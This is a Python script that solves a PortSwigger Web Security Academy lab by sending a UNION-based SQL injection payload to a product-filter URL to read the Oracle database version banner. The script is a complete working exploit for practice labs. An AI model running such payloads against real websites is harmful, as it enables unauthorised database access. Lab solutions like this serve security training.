#!/usr/bin/env python3
# Lab: SQL injection attack, querying the database type and version on Oracle
# Lab-Link: <https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle>
# Difficulty: PRACTITIONER
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit(host):
    url = f'{host}/filter?category=Gifts'
    payload = "' UNION SELECT null,banner FROM v$version--"
    r = requests.get(f'{url}{payload}', verify=False, proxies=proxies)
    if 'Congratulations, you solved the lab' in r.text:
        return True
    return False


if __name__ == "__main__":
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Example: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    if exploit(host):
        print('[+] Injection successful')
    else:
        print('[-] Injection not successful')
